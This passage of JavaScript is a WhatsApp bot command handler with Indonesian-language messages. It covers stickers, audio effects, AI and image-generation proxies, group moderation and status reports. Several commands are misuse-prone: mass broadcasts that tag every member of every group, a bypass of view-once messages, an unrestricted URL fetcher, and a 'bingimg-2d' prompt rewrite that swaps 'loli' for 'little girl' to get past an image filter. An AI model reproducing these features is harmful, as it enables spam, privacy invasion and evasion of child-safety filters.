case 'hidetag': case 'ht': {
if (!isAdmins) return
ptz.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
}
break

        case 'bcgc': case 'bcgroup': {
if (!isCreator) return m.reply('Khusus owner')
await loading()
if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} Update ${global.botname} !`)
let getGroups = await ptz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat.`)
for (let i of anu) {
await sleep(1500)
ptz.sendMessage(i, {text: `${text}`}, {quoted:m})
    }
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
   case 'jpm':{
if (!isCreator) return reply("?")
if (!text) return replygcxeon(`*Salah Format*\n${prefix+command} text|jeda\nReply foto untuk di jpm Kasih jeda, 1000 = 1 detik\n\nExample: ${prefix + command} kris siamang tunggal|4000`)
let getGroups = await ptz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await ptz.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await ptz.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPH(media)
await ptz.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await ptz.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply(`Success`)
}
break
        
 /* ################# Thaks ############### */
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
//=================================================//
case "disk":{
exec('cd && du -h --max-depth=1', (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) return reply(stdout)
})
}
break
//=================================================//
case "add":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('masukkan nomor yang ingin di tambahkan')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'add').catch(console.log)
}
break
//=================================================//
case "kick":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('masukkan nomor yang ingin di kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
//=================================================//
case "promote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('masukkan nomor yang ingin di promote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'promote').catch(console.log)
}
break
//=================================================//
case "demote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('masukkan nomor yang ingin di demote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'demote').catch(console.log)
}
break
//=================================================//
/*ase "ai":{
if (!text) return reply("mau nanya apa sama naw")
let { data } = await axios.get("https://www.putz.my.id/api/ai?type=hercai&q=" + text)
reply(data.result)
}
break*/
//=================================================//
case "gemini-img":{
if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply("hanya support gambar")
let media = await ptz.downloadAndSaveMediaMessage(qmsg)
let urlgambar = await TelegraPH(media)
let { data } = await axios.get("https://gmni.vercel.app/api/img?imageUrl="+ urlgambar +"&prompt=" + text)
reply(data.text)
}
break
//=================================================//
case "gemini":{
if (!text) return reply("mau nanya apa sama naw")
let { data } = await axios.get("https://gmni.vercel.app/api/ask?text=" + text)
reply(data.text)
}
break
//=================================================//
case "ocr":{
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return m.reply(`balas gambar dengan perintah .ocr`)
if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`_*jenis ${mime} tidak didukung!*_`)
const ocrapi = require("ocr-space-api-wrapper")
let img = await ptz.downloadAndSaveMediaMessage(q)
let url = await TelegraPH(img)
let hasil = await ocrapi.ocrSpace(url)
 await m.reply(hasil.ParsedResults[0].ParsedText)
}
break
//=================================================//
case "stickers":{
if (!text) return m.reply(`Ex : ${prefix + command} kucing`);
const anu = await stickersearch(text);
const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
const randomStickers = shuffledStickers.slice(0, 10);

if (randomStickers.length > 0) {
for (let i = 0; i < randomStickers.length; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
await ptz.sendImageAsSticker(m?.chat, randomStickers[i], m, {
packname: global.packname,
author: global.author
});
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await reply(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
}
}
}}
break
//=================================================//
case "tr":{
let lang, text
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else throw `Ex: ${usedPrefix + command} id hello i am robot`
const translate = require('@vitalets/google-translate-api')
let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return reply(`Error : Bahasa"${lang}" Tidak Support`)
reply(`*Terdeteksi Bahasa:* ${res.from?.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
}
break
//=================================================//
/*case 'ss': case 'ssweb':{
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
let krt = await ssweb(text)
ptz.sendMessage(m.chat,{image: krt.result, caption: "Done"},{quoted:fsaluran})
}
break*/
//=================================================//
case "kalkulator":{
 val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
reply(`*${format}* = _${result}_`)
} catch (e) {
if (e == undefined) return reply('Isinya?')
reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
}
break
//=================================================//
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':{
if (!qmsg) return m.reply("reply audio nya")
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await ptz.downloadAndSaveMediaMessage(qmsg)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
ptz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else m.reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
console.log(e)
m.reply('error')
}}
break
//=================================================//
case "jarak":{
var [fromf, to] = text.split`|`
if (!(fromf && to)) return m.reply(`Ex: ${prefix + command} jakarta|bandung`)
var data = await jarak(fromf, to)
if (data.img) return ptz.sendMessage(m?.chat, { image: data.img, caption: data.desc }, { quoted:fsaluran })
else reply(data.desc)
}
break
//=================================================//

//=================================================//
case 'cls': {
if (!m?.quoted) return reply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) throw 'Failed to download sticker!'
stiker = await addExif(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) ptz.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else throw 'Conversion failed'
}
}
break 
//=================================================//
case 'tts':{
if (!text) return reply(`[ ! ] ${prefix}${command} halo world`)
 const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", { text: text, voice: "id_001" }, { headers: { Referer: "https://gesserit.co/tiktok", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" ,responseType: "arraybuffer"}})).data
const b = Buffer.from(a.audioUrl)
ptz.sendMessage(m?.chat, { audio: Buffer.from(a.audioUrl.split("base64,")[1],"base64"), mimetype: "audio/mpeg" })
}
break
//=================================================//
case 'remini':{
if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply("hanya support gambar")
let media = await quoted.download()
const This = await remini(media, "enhance");
ptz.sendFile(m?.chat, This, "", "Done", m);
}
break
//=================================================//
case 'tiktok':
case 'tt': {
if (args.length == 0) return m.reply(`Example: ${prefix + command} link lu`)
let res = await tiktok2(`${text}`)
				ptz.sendMessage(m.chat, { video: { url: res.no_watermark }, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
				
                    ptz.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
			})
}
break
//=================================================//
case "get": {
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res = await fetch(url)
if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
delete res
throw `Content-Length: ${res.headers.get('content-length')}`
}
if (!/text|json/.test(res.headers.get('content-type'))) return ptz.sendFile(m?.chat, url, 'file', `*Link:* ${linknyaurl}\n\n2024 © Reivaldo`, m)
let txt = await res.buffer()
try {
txt = util.format(JSON.parse(txt + ''))
} catch (e) {
txt = txt + ''
} finally {
reply(txt.slice(0, 65536) + '')
}
}
break
//=================================================//
case 'readvo': case 'readviewonce': {
if (!m?.quoted) return reply('reply gambar/video yang ingin Anda lihat')
if (m?.quoted.mtype !== 'viewOnceMessageV2') return reply('Ini bukan pesan view-once.')
let msg = m?.quoted.message
let type = Object.keys(msg)[0]
const { downloadContentFromMessage } = require('@adiwajshing/baileys')
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
return ptz.sendFile(m?.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return ptz.sendFile(m?.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break
//=================================================//
case 'qc': {
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else reply("Input teks atau reply teks yang ingin di jadikan quote!")
if (!text) return reply('masukan text')
if (text.length > 30) return reply('Maksimal 30 Teks!')
let ppnyauser = await await ptz.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(text, pushname, ppnyauser)
ptz.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
//=================================================//
case 'sticker':
case 'stiker':
case 's':{
if (!quoted) return reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ptz.sendImageAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await ptz.sendVideoAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else {
return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case 'smeme': {
let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) return reply(respond)
if (!text) return reply(respond)
try {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await ptz.downloadAndSaveMediaMessage(qmsg)
let fatGans = await TelegraPH(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
let FaTiH = await ptz.sendImageAsSticker(m?.chat, smeme, m, { packname: global.packname, author: global.auhor })
await fs.unlinkSync(FaTiH)
} catch (e) {
}
}
break
 //=================================================//
case 'swm': {
let [teks1, teks2] = text.split`|`
if (!teks1) return reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
if (!teks2) return reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
if (/image/.test(mime)) {
let media = await ptz.downloadMediaMessage(qmsg)
let encmedia = await ptz.sendImageAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await ptz.downloadMediaMessage(qmsg)
let encmedia = await ptz.sendVideoAsSticker(m?.chat, media, m, { packname: teks1, author: teks2 })
await fs.unlinkSync(encmedia)
} else {
return reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case "bingimg-2d": {
if (!text) return reply("[ ! ] masukan prompt gambar yang mau di bikin");
let teksu = text.replace(/loli/gi, "anak gadis kecil");
try {
const { BingApi, apikeybing } = require('./lib/bing-image.js');
const bingApi = new BingApi(apikeybing);
const imagesUrls = await bingApi.createImages(teksu + ". Anime Style ultra, HD Anime Style, 4K Anime Style, Anime Style, High quality, Ultra grapics, HD Cinematic, anime, 4K resolution, HD quality, Ultra CGI, High quality, Ultra grapics, HD Cinematic", false);
const totalCount = imagesUrls.length;
const credits = await bingApi.getCredits();

if (totalCount > 0) {
for (let i = 0; i < totalCount; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
ptz.sendMessage(m?.chat, { image: { url: imagesUrls[i] }, caption: `Image *(${i + 1}/${totalCount})*\n\nRemaining Credits: ${credits}\nPrompt: ${text}` }, { quoted:fsaluran });
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await reply(`Failed to send image *(${i + 1}/${totalCount})*`);
}
}
} else {
await reply('No images found after filtering.');
}
} catch (error) {
await reply('An error occurred while processing the request.');
}
};
break
//=================================================//
case "ping":
case "botstatus":
case "statusbot": {
const used = process.memoryUsage();
const cpus = os.cpus().map((cpu) => {
cpu.total = Object.keys(cpu.times).reduce(
(last, type) => last + cpu.times[type],
0,
);
return cpu;
});
const cpu = cpus.reduce(
(last, cpu, _, { length }) => {
last.total += cpu.total;
last.speed += cpu.speed / length;
last.times.user += cpu.times.user;
last.times.nice += cpu.times.nice;
last.times.sys += cpu.times.sys;
last.times.idle += cpu.times.idle;
last.times.irq += cpu.times.irq;
return last;
},
{
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0,
},
},
);

var date = new Date();
var jam = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();
var ram = `${formatSize(process.memoryUsage().heapUsed)} / ${formatSize(os.totalmem)}`;
var cpuuuu = os.cpus();
var sisaram = `${Math.round(os.freemem)}`;
var totalram = `${Math.round(os.totalmem)}`;
var persenram = (sisaram / totalram) * 100;
var persenramm = 100 - persenram;
var ramused = totalram - sisaram;

var space = await checkDiskSpace(process.cwd());
var freespace = `${Math.round(space.free)}`;
var totalspace = `${Math.round(space.size)}`;
var diskused = totalspace - freespace;
var neww = performance.now();
var oldd = performance.now();
let timestamp = speed();
let latensi = speed() - timestamp;
var { download, upload } = await checkBandwidth();
let respon = ` *ᴘ ɪ ɴ ɢ* 
 ${Math.round(neww - oldd)} ms 
 ${latensi.toFixed(4)} ms 

 *ʀ ᴜ ɴ ᴛ ɪ ᴍ ᴇ*
 ${runtime(process.uptime())} 

 *s ᴇ ʀ ᴠ ᴇ ʀ* 
 *🛑 ʀᴀᴍ:* ${formatSize(ramused)} (${persenramm?.toString().split('.')[0]}%) / ${formatSize(totalram)} 
 *🔵 ғʀᴇᴇRAM:* ${formatSize(sisaram)} 
 *🔴 ᴍᴇᴍᴏʀy:* ${ram}
 *🗂 ᴅɪꜱᴋ:* ${formatSize(diskused)} / ${formatSize(totalspace)}
 *📂 ғʀᴇᴇDISK:* ${formatSize(freespace)}
 *🔭 ᴘʟᴀᴛғᴏʀᴍ:* ${os.platform()}
 *🧿 sᴇʀᴠᴇʀ:* ${os.hostname()}
 *📤 ᴜᴘʟᴏᴀᴅ:* ${upload}
 *📥 ᴅᴏᴡɴʟᴏᴀᴅ:* ${download}
 *⏰ ᴛɪᴍᴇ sᴇʀᴠᴇʀ:* ${jam} : ${menit} : ${detik}
 
 *📮 ɴᴏᴅᴇᴊꜱ ᴠᴇʀꜱɪᴏɴ:* ${process.version}
 *💻 ᴄᴘᴜ ᴍᴏᴅᴇʟ:* ${cpuuuu[0].model}
 *📊 ᴏꜱ ᴠᴇʀꜱɪᴏɴ:* ${os.version()}
 
_NodeJS Memory Usaage_
${Object.keys(used)
.map(
(key, _, arr) =>
`${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
used[key],
)}`,
)
.join("\n")}
${readmore}
${cpus[0]
? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
.map(
(cpu, i) =>
`${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
cpu.times,
)
.map(
(type) =>
`- *${(type + "*").padEnd(6)}: ${(
(100 * cpu.times[type]) /
cpu.total
).toFixed(2)}%`,
)
.join("\n")}`,
)
.join("\n\n")}`
: ""
}
`.trim();
ptz.relayMessage(m?.chat,{
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: respon,
contextInfo: {
mentionedJid: [m?.sender],
externalAdReply: {
showAdAttribution: true
}}}}}}, {})
}
break

case 'dalle': case 'dall-e':
if (!text) return reply("*`masukan query`*\nExample: .dall-e rain")
dallres = `https://widipe.com/v5/text2img?text=${text}`
 ptz.sendMessage(m.chat, {
 image: {url: dallres},
 caption: `${text}`
 },{quoted:fsaluran })
break

case "prompt-gpt": {
if (!text) return reply (`Example : ${prefix + command} buatkan lirik aku lagu Roleplay Hitam gerne Rap|# Lirik Lagu,# Genre: Rap,# Panjang: 14 baris,# Tema: Roleplay Hitam
`)
iniprompt = q.split("|")[0]
initeks = q.split("|")[1]
var js = await fetch(`https://widipe.com/prompt/gpt?prompt=${iniprompt}&text=${initeks}`) 
var json = await js.json()
reply(json.result)
}
break
case "gptgo": {
if (!text) return reply (`*Example : ${prefix + command} Hello*`)
var js = await fetch(`https://widipe.com/gptgo?text=${q}`) 
var json = await js.json()
let que = "`"
reply(`${que}Gpt-Go${que}\n\n ${json.result}`)
}
break

case 'tomp4':
case 'tovideo': {
if (!/webp/.test(mime)) m.reply(`reply stiker dengan caption *${prefix + command}*`)
const webp2mp4File = require("./converter.js")
let media = await ptz.downloadAndSaveMediaMessage(qmsg)
let webpToMp4 = await webp2mp4File(media)
await ptz.sendMessage(m.chat, {
video: {
url: webpToMp4.result,
caption: 'Convert Webp To Video'
}
}, {
quoted:fsaluran
})
await fs.unlinkSync(media)

}
break



case 'bingai': case 'bing-ai': {
if (text === 'loli') {
reply('Pedo lu ?')
} else if (text === 'furry') {
reply('kocak')
} else {
reply('Masukan Query\n\nEdample: .bing-ai Hallo')
}

const bing = await fetchJson(`https://widipe.com/bingai?text=${text}`)
const sult = bing.result
reply(sult)
}
break


case 'tess':
reply('BOT ONLINE')
break

case 'tourl': 
 let media = await ptz.downloadAndSaveMediaMessage(qmsg)
if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
let urlgambar = await TelegraPH(media)
let qqq = "`"
reply(`*${qqq}Succes Upload To Telegraph${qqq}*\n\n*Url:* ${urlgambar}\n*Note: No Expire Date*\n\n*Thaks For Using Me !*`)
break

case 'use-power':
let pewer = "*`[ POWER - SELECT ]`*\n\n• .power-energy\n• .power-mahkota\n\n*More ? Coming Soon*"
reply(pewer)
break



case 'nevo':{
if (!text) return reply('Mau Nanya apa emang')
let dataa = await fetchJson(`https://ai.nevolution.team/nevo?apikey=akbarrdev&prompt=${text}`)
let unvo = dataa.response
reply(unvo)
} 
break


case "pin": case "pintesert": {
if (!text) return reply("Masukan Query")
 async function createImage(url) {
    try {
        const { imageMessage } = await generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: ptz.waUploadToServer
        });
        return imageMessage;
    } catch (error) {
        console.error("Error creating image message:", error);
        return null;
    }
}



async function sendPinterestImages(text, m) {
    try {
        let push = [];
        let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let res = data.resource_response.data.results.map(v => v.images.orig.url);

        shuffleArray(res); 
        let ult = res.splice(0, 5); 
        let i = 1;

        for (let lucuy of ult) {
            const imageMessage = await createImage(lucuy);
            if (imageMessage) {
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `Image ke - ${i++}`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({
                        text: ""
                    }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: 'Hasil.',
                        hasMediaAttachment: true,
                        imageMessage: imageMessage
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
                            }
                        ]
                    })
                });
            }
        }

        const bot = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: "Ilustrasi Dari Anda inginkan"
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: "5 Image -"
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: false
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: [
                                ...push
                            ]
                        })
                    })
                }
            }
        }, {});

        ptz.relayMessage(m.chat, bot.message, {
            messageId: bot.key.id
        });

    } catch (error) {
        console.error("Error sending Pinterest images:", error);
        reply("An error occurred while processing your request.");
    }
}
sendPinterestImages(text, m);
}
break

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
case 'delcase': {
 if (!isCreator) return reply('Hanya creator yang bisa menghapus case.');
 if (!text) return reply('Mana case yang ingin dihapus?');

 // Nama file yang akan dimodifikasi
 const namaFile = './message.js';

 // Case yang ingin Anda hapus
 const caseToDelete = `case '${text}':`;

 // Baca isi file
 fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('Terjadi kesalahan saat membaca file:', err);
 return reply('Terjadi kesalahan saat membaca file.');
 }
const posisiCase = data.indexOf(caseToDelete);
 if (posisiCase === -1) {
 return reply(`Case '${args}' tidak ditemukan dalam file.`);
 }

 // Cari posisi break; berikutnya setelah case
 const posisiBreak = data.indexOf('break;', posisiCase);
 if (posisiBreak === -1) {
 return reply('Tidak dapat menemukan "break;" setelah case yang ingin dihapus.');
 }

 // Potong data untuk menghapus case
 const kodeBaruLengkap = data.slice(0, posisiCase) + data.slice(posisiBreak + 'break;'.length);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
 if (err) {
 console.error('Terjadi kesalahan saat menulis file:', err);
 return reply('Terjadi kesalahan saat menulis file.');
 } else {
 return reply(`Case '${text}' berhasil dihapus.`);
 }
 });
 });
    }
 break;
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
 

case 'diffusion':
try {
 const hua = await fetchJson(`https://skizo.tech/api/sdxl?apikey=${global.skizo}&prompt=${text}`)
let huaa = hua.url

ptz.sendMessage(m.chat, {image: huaa, caption: `${text}`},{quoted:fsaluran})
} catch (err) {
reply('Gabisa Jir')
}
break

//=================================================//
   
                
//=================================================//                

case "gpt4": 
if (!text) return reply('Mau Nanya apa bang?')
try {
let cct = await fetchJson(`https://widipe.com/gpt4?text=${text}`)
let resq = cct.result
reply(`${resq}`)
} catch (err) {
m.reply('Website Nya error')
}
break

case 'totalfeature':
 case 'totalfitur': 
 case 'totalcmd': 
 case 'totalcommand': 
reply(`${totalfitur}`)
break

case "diffusion": 
if (!text) return m.reply('Apa ya..')
 const rest = await (await fetch(`https://widipe.com/stablediffusion?text=${text}`))

ptz.sendMessage(m.chat,{image: rest, caption: `${text}`},{quoted:fsaluran})
break

case "tts-anime":
if (!text) return m.reply('Kasih Ejaan Biar Tts nya Ke Arti Soalnya Ga support Indonesia, Contoh: Che-pe-tan pai-mon lah-gee nung-goo nee, mow nah-nya ah-pa ?')

 let restts = await fetchJson(`https://skizo.tech/api/tts-anime?apikey=${global.skizo}&text=${text}&lang=japanese&voice=paimon&speed=0.9&symbol=y`)
let Veemonn = restts.data.url_voice
ptz.sendMessage(m.chat, { audio: { url: Veemonn }, fileName: `tts.mp3`, mimetype: 'audio/mp4' })
break

case 'ss': case 'ssweb':{ 
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')

 let tekss99997 = `*DARE - Multi Device*`
let krt = await ssweb(text)
//throw listMessage.sections[0].rows

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: false, 
	businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 externalAdReply: { 
 title: 'Ziyo', 
 thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
 sourceUrl: global.sourceurl,
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: 
proto.Message.InteractiveMessage.Body.create({
 text: tekss99997
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "ziyo",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: krt.result }, { upload: ptz.waUploadToServer }))
 }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
{
 "name": "cta_copy",
 "buttonParamsJson": "{\"display_text\":\"Copy Url Web\",\"id\":\"123456789\",\"copy_code\":\"Www.Zio-Ganteng.coy.my.id\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

case 'stop-jadibot':
 if (!isPremium) return reply("*`Khusus Prem Saya kak`*")
 if (!text) return m.reply("Tambah kan nomor yang mau di stop")
 const folderPath = `./session2/jadibot/${text}`; 

 if (!fs.existsSync(folderPath)) {
 return reply('Belum Jadibot');
 }

 try {
 fs.rmSync(folderPath, { recursive: true, force: true });
 reply('Session telah dihapus.');
 } catch (error) {
 m.reply('Error :', error);
 }
